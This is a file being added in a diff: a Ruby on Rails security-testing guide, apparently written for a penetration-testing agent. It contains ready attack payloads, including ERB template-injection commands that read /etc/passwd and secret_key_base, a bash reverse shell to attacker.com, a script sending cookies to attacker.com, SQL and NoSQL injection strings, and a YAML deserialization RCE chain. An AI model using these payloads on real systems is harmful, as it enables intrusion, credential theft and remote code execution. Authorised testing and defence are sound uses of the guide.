@@ -1,0 +1,887 @@
+<rails_security_guide>
+<title>RUBY ON RAILS SECURITY TESTING</title>
+
+<critical>Ruby on Rails applications have framework-specific vulnerabilities including mass assignment, strong parameters bypass, CSRF token issues, session fixation, render template injection, and ActiveRecord injection. Focus on Rails-specific patterns and conventions that lead to security flaws.</critical>
+
+<scope>
+- Mass assignment vulnerabilities
+- Strong parameters bypass
+- CSRF token prediction and bypass
+- Session fixation and hijacking
+- Render template injection (ERB, Haml)
+- ActiveRecord injection (SQL, NoSQL)
+- Route manipulation and constraint bypass
+- Insecure deserialization (YAML, Marshal)
+- File upload vulnerabilities (ActiveStorage)
+</scope>
+
+<methodology>
+1. Identify Rails version and gems (check headers, error pages, Gemfile.lock)
+2. Map routes and controllers (rails routes, analyze JavaScript)
+3. Test strong parameters enforcement
+4. Probe CSRF token generation and validation
+5. Test template rendering for injection
+6. Analyze ActiveRecord queries for injection
+7. Examine session handling and cookie security
+</methodology>
+
+<mass_assignment>
+<concept>
+{% raw %}
+# Rails allows assigning multiple attributes at once
+# Without proper filtering, users can modify unintended fields
+
+# Vulnerable code:
+def create
+  @user = User.new(params[:user])
+  @user.save
+end
+
+# Attack:
+POST /users
+{
+  "user": {
+    "email": "attacker@evil.com",
+    "password": "password123",
+    "role": "admin",      // Unintended field
+    "is_verified": true,  // Unintended field
+    "balance": 999999     // Unintended field
+  }
+}
+
+# Result: User created with admin role and high balance
+{% endraw %}
+</concept>
+
+<detection>
+{% raw %}
+# Look for vulnerable patterns in code/responses
+
+# Old Rails (< 4.0) used attr_accessible
+# Modern Rails uses strong parameters
+
+# Check error messages:
+POST /users {"user": {"email": "test@example.com", "admin": true}}
+# Error: "Unpermitted parameter: admin"
+# -> Strong parameters enforced (good)
+
+# No error -> Vulnerable to mass assignment
+
+# Blind testing:
+# Create account with extra fields
+# Check if fields were set (profile page, API response)
+{% endraw %}
+</detection>
+
+<exploitation>
+{% raw %}
+# Common vulnerable fields to inject
+
+# Role/privilege fields:
+{"role": "admin"}
+{"admin": true}
+{"is_admin": true}
+{"user_type": "administrator"}
+{"permissions": ["read", "write", "delete"]}
+
+# Financial fields:
+{"balance": 999999}
+{"credits": 100000}
+{"discount_rate": 100}
+{"price": 0}
+
+# Status fields:
+{"is_verified": true}
+{"is_approved": true}
+{"status": "active"}
+{"confirmed": true}
+
+# Timestamps:
+{"created_at": "2020-01-01"}
+{"updated_at": "2099-12-31"}
+{"password_reset_sent_at": "2099-01-01"}
+
+# Associations:
+{"group_id": 1}  // Admin group
+{"organization_id": 123}  // Another org
+{"parent_id": null}  // Orphan record
+
+# Counter caches:
+{"posts_count": 1000}
+{"followers_count": 999999}
+
+# Hidden attributes:
+{"api_key": "custom_key"}
+{"secret_token": "known_value"}
+{"encrypted_password": "known_hash"}
+{% endraw %}
+</exploitation>
+
+<bypass_techniques>
+{% raw %}
+# Bypass strong parameters
+
+# Nested attributes:
+{
+  "user": {
+    "email": "test@example.com",
+    "profile_attributes": {
+      "bio": "Hello",
+      "admin": true  // Nested injection
+    }
+  }
+}
+
+# JSON vs form-encoded
+# Strong parameters may differ by content-type
+Content-Type: application/json
+vs
+Content-Type: application/x-www-form-urlencoded
+
+# Array injection:
+{"user": {"role": ["admin"]}}  // Array instead of string
+
+# Type confusion:
+{"user": {"id": "1"}}  // String vs integer
+
+# Symbol vs string keys:
+# Rails normalizes but edge cases exist
+
+# Attribute overriding in updates:
+PATCH /users/123
+{
+  "user": {
+    "email": "new@example.com",
+    "id": 456  // Try to change ID
+  }
+}
+{% endraw %}
+</bypass_techniques>
+</mass_assignment>
+
+<strong_parameters_bypass>
+<common_patterns>
+{% raw %}
+# Strong parameters with permit
+
+# Safe:
+def user_params
+  params.require(:user).permit(:email, :password)
+end
+
+# Vulnerable patterns:
+
+# 1. permit! (allows all)
+def user_params
+  params.require(:user).permit!
+end
+
+# 2. Empty permit (allows nested)
+def user_params
+  params.permit(:user)[:user]
+end
+
+# 3. Overly permissive arrays
+def user_params
+  params.require(:user).permit!.except(:role)
+end
+
+# 4. Conditional permits
+def user_params
+  if current_user.admin?
+    params.require(:user).permit!
+  else
+    params.require(:user).permit(:email)
+  end
+end
+# Test as admin to find all permissible fields
+{% endraw %}
+</common_patterns>
+
+<testing_approach>
+{% raw %}
+# Enumerate allowed parameters
+
+# Try various fields:
+fields = ["role", "admin", "is_admin", "balance", "verified", 
+          "status", "type", "parent_id", "group_id"]
+
+for field in fields:
+    POST /users
+    {
+      "user": {
+        "email": "test@example.com",
+        "password": "pass123",
+        field: test_value
+      }
+    }
+    # Check response for errors or success
+
+# Pay attention to error messages:
+# "Unpermitted parameter: role" -> blocked
+# No error -> may be accepted
+
+# Verify if field was set:
+# Check profile/API response
+GET /users/123
+# Look for injected field in response
+{% endraw %}
+</testing_approach>
+
+<nested_attributes>
+{% raw %}
+# accepts_nested_attributes_for
+
+# Model:
+class User < ApplicationRecord
+  has_one :profile
+  accepts_nested_attributes_for :profile
+end
+
+# Attack via nested attributes:
+{
+  "user": {
+    "email": "test@example.com",
+    "profile_attributes": {
+      "bio": "Hello",
+      "admin": true,  // Inject into profile
+      "user_id": 456  // Change association
+    }
+  }
+}
+
+# Or with has_many:
+{
+  "user": {
+    "posts_attributes": [
+      {
+        "title": "Post 1",
+        "author_id": 999  // Inject author
+      }
+    ]
+  }
+}
+
+# Destroy via nested:
+{
+  "user": {
+    "profile_attributes": {
+      "id": 123,
+      "_destroy": true  // Delete profile
+    }
+  }
+}
+{% endraw %}
+</nested_attributes>
+</strong_parameters_bypass>
+
+<csrf_vulnerabilities>
+<token_prediction>
+{% raw %}
+# Rails CSRF token structure
+
+# Old Rails (< 5.2):
+# Token = Base64(Random bytes)
+# Stored in session, compared directly
+
+# Rails 5.2+:
+# Token = Base64(Random bytes XOR session_id)
+# More secure, per-session
+
+# Attack old versions:
+# If token generation is weak:
+# Predict or brute-force token
+
+# Check token in form:
+<input type="hidden" name="authenticity_token" value="abc123...">
+
+# Test reuse:
+# Extract token from one session
+# Try in different session
+{% endraw %}
+</token_prediction>
+
+<bypass_techniques>
+{% raw %}
+# CSRF protection bypass
+
+# 1. Missing verification:
+# Check if POST/PUT/DELETE without token succeed
+
+POST /users/123
+Content-Type: application/json
+{"user": {"role": "admin"}}
+# No authenticity_token
+
+# 2. Content-Type bypass:
+# Rails may skip CSRF for API-like requests
+Content-Type: application/json
+# vs
+Content-Type: application/x-www-form-urlencoded
+
+# 3. Null token:
+authenticity_token=null
+
+# 4. Empty token:
+authenticity_token=
+
+# 5. Method override:
+POST /users/123?_method=DELETE
+# If CSRF only checked on DELETE
+
+# 6. Header vs parameter:
+# Some configs check X-CSRF-Token header
+# Others check authenticity_token param
+# Test both
+
+# 7. API endpoints without CSRF:
+# /api/* routes may not enforce CSRF
+POST /api/users/123
+{"role": "admin"}
+
+# 8. Origin header manipulation:
+Origin: https://trusted-site.com
+# If server validates Origin instead of token
+{% endraw %}
+</bypass_techniques>
+
+<token_reuse>
+{% raw %}
+# Test token reuse across sessions
+
+# Session A's form:
+<input name="authenticity_token" value="token_A">
+
+# Try token_A in Session B:
+POST /users (Session B)
+authenticity_token=token_A
+
+# Expected: Rejected
+# Actual (vulnerable): Accepted
+
+# Or across users:
+# User A's token used by User B
+# If token not tied to session properly
+{% endraw %}
+</token_reuse>
+</csrf_vulnerabilities>
+
+<session_attacks>
+<session_fixation>
+{% raw %}
+# Force victim to use attacker's session
+
+# Rails session in cookie (default):
+Cookie: _myapp_session=abc123
+
+# Attack:
+# 1. Get valid session ID
+# 2. Victim uses that session (via URL or cookie injection)
+# 3. Victim logs in
+# 4. Attacker's session now authenticated
+
+# Test:
+# 1. Create session as attacker
+# 2. Extract _myapp_session cookie value
+# 3. Set that cookie for victim user
+# 4. Victim logs in
+# 5. Attacker uses same session -> authenticated
+
+# Mitigation check:
+# Rails should reset session on login
+# Check if session ID changes after authentication
+{% endraw %}
+</session_fixation>
+
+<session_hijacking>
+{% raw %}
+# Steal or guess session tokens
+
+# Rails session storage:
+# - Cookie (encrypted) - default
+# - Redis
+# - ActiveRecord (database)
+# - Memcache
+
+# Cookie-based (CookieStore):
+Cookie: _myapp_session=<encrypted_data>
+
+# Attack 1: Decrypt cookie
+# If secret_key_base is leaked:
+# Decrypt session cookie
+# Read/modify session data
+
+# Finding secret_key_base:
+# - config/secrets.yml
+# - config/credentials.yml.enc (needs master.key)
+# - Environment variables
+# - Git history
+# - Error messages
+
+# Attack 2: Brute-force weak secret:
+# If secret_key_base is weak/default
+
+# Attack 3: Session fixation (above)
+
+# Attack 4: XSS to steal cookie
+# If HTTPOnly not set:
+<script>document.location='http://attacker.com/?c='+document.cookie</script>
+{% endraw %}
+</session_hijacking>
+
+<cookie_tampering>
+{% raw %}
+# Tamper with session cookie
+
+# If secret_key_base known:
+# Decrypt, modify, re-encrypt cookie
+
+# Ruby code:
+require 'cgi'
+require 'active_support'
+
+cookie_value = '_myapp_session=...'
+secret = 'leaked_secret_key_base'
+
+# Decrypt:
+verifier = ActiveSupport::MessageVerifier.new(secret)
+session_data = verifier.verify(CGI.unescape(cookie_value))
+
+# Modify:
+session_data['user_id'] = 999  # Admin user
+session_data['role'] = 'admin'
+
+# Re-encrypt:
+new_cookie = verifier.generate(session_data)
+
+# Use new_cookie in requests
+{% endraw %}
+</cookie_tampering>
+</session_attacks>
+
+<template_injection>
+<erb_injection>
+{% raw %}
+# ERB (Embedded Ruby) template injection
+
+# Vulnerable code:
+# Direct rendering of user input
+render inline: params[:template]
+render inline: "Hello #{params[:name]}"
+
+# Attack payloads:
+# Basic execution:
+<%= system('id') %>
+<%= `whoami` %>
+
+# Read file:
+<%= File.read('/etc/passwd') %>
+<%= IO.read('/etc/passwd') %>
+
+# Code execution:
+<%= eval('`id`') %>
+<%= exec('cat /etc/passwd') %>
+
+# Module methods:
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+
+# Rails helpers:
+<%= Rails.env %>
+<%= Rails.root %>
+<%= Rails.application.secrets.secret_key_base %>
+
+# ActiveRecord:
+<%= User.count %>
+<%= User.all.to_json %>
+<%= User.first.password_digest %>
+
+# Reverse shell:
+<%= `bash -i >& /dev/tcp/attacker.com/4444 0>&1` %>
+{% endraw %}
+</erb_injection>
+
+<haml_injection>
+{% raw %}
+# Haml template injection
+
+# Vulnerable:
+render inline: params[:template], type: :haml
+
+# Attack payloads:
+# Basic:
+= system('id')
+= `whoami`
+
+# Code execution:
+= eval('`id`')
+
+# File read:
+= File.read('/etc/passwd')
+
+# Rails-specific:
+= Rails.application.secrets.secret_key_base
+= User.first.attributes
+{% endraw %}
+</haml_injection>
+
+<detection>
+{% raw %}
+# Find template injection
+
+# Test for reflection:
+# Input: {{7*7}}
+# Output: 49 (vulnerable)
+# or {{7*7}} (safe)
+
+# Input: <%= 7*7 %>
+# Output: 49 (ERB injection)
+
+# Input: #{ 7*7 }
+# Output: 49 (Ruby string interpolation)
+
+# Common injection points:
+# - Search queries
+# - Email templates
+# - PDF generation
+# - Custom pages/widgets
+# - Error messages
+
+# Test URL:
+GET /search?q=<%= 7*7 %>
+# Or:
+POST /render
+{"template": "<%= 7*7 %>"}
+{% endraw %}
+</detection>
+</template_injection>
+
+<activerecord_injection>
+<sql_injection>
+{% raw %}
+# SQL injection in ActiveRecord
+
+# Vulnerable patterns:
+
+# 1. String interpolation:
+User.where("email = '#{params[:email]}'")
+# Attack: params[:email] = "' OR '1'='1"
+
+# 2. Raw SQL:
+User.find_by_sql("SELECT * FROM users WHERE email = '#{email}'")
+
+# 3. Pluck/select with interpolation:
+User.pluck("email, #{params[:field]}")
+# Attack: params[:field] = "password_digest"
+
+# 4. Order clause:
+User.order(params[:sort])
+# Attack: params[:sort] = "id DESC; DROP TABLE users--"
+
+# 5. Group clause:
+User.group(params[:group_by])
+
+# 6. Having clause:
+User.having("#{params[:condition]}")
+
+# Safe alternatives:
+# Use parameterized queries:
+User.where("email = ?", params[:email])
+User.where(email: params[:email])
+{% endraw %}
+</sql_injection>
+
+<nosql_injection>
+{% raw %}
+# NoSQL injection (MongoDB with Mongoid)
+
+# Vulnerable:
+User.where(params[:query])
+
+# Attack:
+POST /search
+{
+  "query": {
+    "$ne": null
+  }
+}
+# Returns all users
+
+# Or:
+{
+  "query": {
+    "role": {"$ne": "admin"},
+    "$or": [{"role": "admin"}]
+  }
+}
+
+# Injection in authentication:
+{
+  "user": {
+    "email": {"$ne": null},
+    "password": {"$ne": null}
+  }
+}
+# Bypasses authentication
+{% endraw %}
+</nosql_injection>
+
+<order_by_injection>
+{% raw %}
+# ORDER BY injection
+
+# Vulnerable:
+@users = User.order(params[:sort])
+
+# Attack 1: Change sort order:
+params[:sort] = "created_at DESC"
+params[:sort] = "role ASC"  // Enumerate roles
+
+# Attack 2: Blind SQL injection:
+params[:sort] = "id AND (SELECT SLEEP(5))--"
+# If delays 5 seconds -> SQLi confirmed
+
+# Attack 3: Column enumeration:
+params[:sort] = "invalid_column"
+# Error reveals table structure
+
+# Attack 4: Union-based:
+params[:sort] = "id UNION SELECT password_digest FROM users--"
+
+# Safe:
+ALLOWED_SORTS = ['created_at', 'email', 'name']
+sort = ALLOWED_SORTS.include?(params[:sort]) ? params[:sort] : 'created_at'
+User.order(sort)
+{% endraw %}
+</order_by_injection>
+</activerecord_injection>
+
+<route_manipulation>
+<route_constraints>
+{% raw %}
+# Rails routes with constraints
+
+# routes.rb:
+get '/admin', to: 'admin#index', constraints: { ip: /127\.0\.0\.1/ }
+
+# Attack: X-Forwarded-For header
+GET /admin
+X-Forwarded-For: 127.0.0.1
+
+# If constraint checks X-Forwarded-For instead of remote IP
+
+# Or:
+get '/api/users', constraints: { format: 'json' }
+# Bypass by adding .json extension:
+GET /api/users.json
+{% endraw %}
+</route_constraints>
+
+<format_bypass>
+{% raw %}
+# Format-specific routes
+
+# Respond only to JSON:
+respond_to do |format|
+  format.json { render json: @users }
+end
+
+# Attack: Add .json to URL
+GET /admin/users.json
+# May bypass HTML-only authentication
+
+# Or content-type negotiation:
+GET /admin/users
+Accept: application/json
+{% endraw %}
+</format_bypass>
+
+<namespace_bypass>
+{% raw %}
+# Namespaced routes
+
+# routes.rb:
+namespace :admin do
+  resources :users
+end
+
+# Routes:
+# /admin/users
+
+# Attack: Double-check authorization
+# Admin namespace but no admin check in controller
+
+# Test:
+GET /admin/users (as regular user)
+# Expected: Forbidden
+# Actual (vulnerable): Returns data
+{% endraw %}
+</namespace_bypass>
+</route_manipulation>
+
+<deserialization>
+<yaml_deserialization>
+{% raw %}
+# YAML deserialization RCE
+
+# Vulnerable:
+YAML.load(params[:data])
+
+# Attack payload:
+--- !ruby/object:Gem::Installer
+i: x
+- !ruby/object:Gem::SpecFetcher
+i: y
+- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::Package::TarReader
+  io: &1 !ruby/object:Net::BufferedIO
+    io: &1 !ruby/object:Gem::Package::TarReader::Entry
+      read: 0
+      header: "abc"
+    debug_output: &1 !ruby/object:Net::WriteAdapter
+      socket: &1 !ruby/object:Gem::RequestSet
+        sets: !ruby/object:Net::WriteAdapter
+          socket: !ruby/module 'Kernel'
+          method_id: :system
+        git_set: id
+      method_id: :resolve
+
+# Simplified RCE payload:
+data = "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Package::TarReader\nio: !ruby/object:Net::BufferedIO\nio: !ruby/object:Gem::Package::TarReader::Entry\nread: 0\nheader: abc\ndebug_output: !ruby/object:Net::WriteAdapter\nsocket: !ruby/object:Gem::RequestSet\nsets: !ruby/object:Net::WriteAdapter\nsocket: !ruby/module 'Kernel'\nmethod_id: :system\ngit_set: id\nmethod_id: :resolve"
+
+POST /api/import
+Content-Type: application/x-yaml
+<YAML_PAYLOAD>
+
+# Safe alternatives:
+YAML.safe_load(params[:data], permitted_classes: [Symbol, Date])
+{% endraw %}
+</yaml_deserialization>
+
+<marshal_deserialization>
+{% raw %}
+# Marshal deserialization RCE
+
+# Vulnerable:
+Marshal.load(params[:data])
+
+# Marshal is binary format for Ruby objects
+# Can contain arbitrary Ruby code
+
+# Attack:
+# Serialize malicious object:
+payload = Marshal.dump(some_malicious_object)
+# Send as parameter
+
+# Common in:
+# - Cache systems (Redis, Memcached)
+# - Cookies (if not using JSON serializer)
+# - Message queues
+
+# Safe alternative:
+# Use JSON serialization instead of Marshal
+{% endraw %}
+</marshal_deserialization>
+</deserialization>
+
+<file_upload>
+<activestorage_abuse>
+{% raw %}
+# ActiveStorage vulnerabilities
+
+# Attack 1: Upload malicious file
+# SVG with XSS:
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(document.cookie)</script>
+</svg>
+
+# Attack 2: Content-Type manipulation
+POST /rails/active_storage/direct_uploads
+{
+  "blob": {
+    "filename": "shell.php.jpg",
+    "content_type": "image/jpeg",
+    "byte_size": 1000
+  }
+}
+# Upload PHP shell as "image"
+
+# Attack 3: Path traversal in filename:
+{
+  "filename": "../../../shell.php"
+}
+
+# Attack 4: Large file DoS:
+{
+  "byte_size": 999999999999
+}
+
+# Attack 5: Direct access to blobs:
+GET /rails/active_storage/blobs/<blob_id>
+# Check if authorization required
+
+# Attack 6: Virus/malware upload
+# If no AV scanning
+
+# Mitigation checks:
+# - Content-Type validation?
+# - File extension whitelist?
+# - Virus scanning?
+# - Size limits?
+# - Authorization on access?
+{% endraw %}
+</activestorage_abuse>
+</file_upload>
+
+<validation>
+1. Demonstrate mass assignment (create user with admin role)
+2. Show strong parameters bypass (inject unintended field)
+3. Prove CSRF bypass (state-changing action without token)
+4. Template injection with code execution (read /etc/passwd)
+5. SQL injection via ActiveRecord (bypass authentication or extract data)
+6. Session fixation or hijacking (access account without credentials)
+7. Deserialization RCE (YAML/Marshal payload execution)
+8. Provide reproducible HTTP requests/code
+</validation>
+
+<false_positives>
+- Strong parameters properly enforced
+- CSRF protection on all state-changing actions
+- Parameterized queries (no string interpolation)
+- Session regeneration on authentication
+- Safe YAML.safe_load with permitted classes
+- Template rendering with proper escaping
+- Input validation and sanitization
+</false_positives>
+
+<impact>
+- Privilege escalation (mass assignment to admin)
+- Authentication bypass (SQL injection, session hijacking)
+- Remote code execution (template injection, deserialization)
+- CSRF leading to unauthorized actions
+- Data exfiltration (SQL injection)
+- Account takeover (session fixation)
+- XSS via file upload
+</impact>
+
+<pro_tips>
+1. Check Rails version—older versions have known CVEs
+2. Look for params.permit! or missing strong parameters
+3. Test ORDER BY clauses—commonly overlooked for SQLi
+4. Template injection in error messages, search, email templates
+5. CSRF bypass often works with Content-Type: application/json
+6. Secret_key_base exposure leads to cookie tampering
+7. YAML.load is critical RCE if user-controlled
+8. Mass assignment most common in create/update actions
+9. Nested attributes expand attack surface significantly
+10. Test API endpoints separately—may skip CSRF
+11. ActiveStorage direct upload URLs may leak
+12. Check Gemfile.lock for vulnerable gem versions
+13. Session fixation: verify session ID changes after login
+14. Console and stack traces leak sensitive info
+15. Format-specific routes (.json) may bypass auth
+</pro_tips>
+
+<remember>Rails security relies on framework conventions being followed correctly. Mass assignment and strong parameters are the most common vulnerability. Template injection (ERB) leads to RCE. YAML.load is almost always a critical vulnerability. SQL injection in ORDER BY clauses is frequently overlooked. Session handling must include regeneration on authentication. CSRF protection can often be bypassed with Content-Type manipulation. Secret_key_base exposure is game over—cookie tampering and session hijacking follow. ActiveRecord associations with nested attributes multiply attack surface. Always check both HTML and JSON endpoints—security may differ.</remember>
+</rails_security_guide>
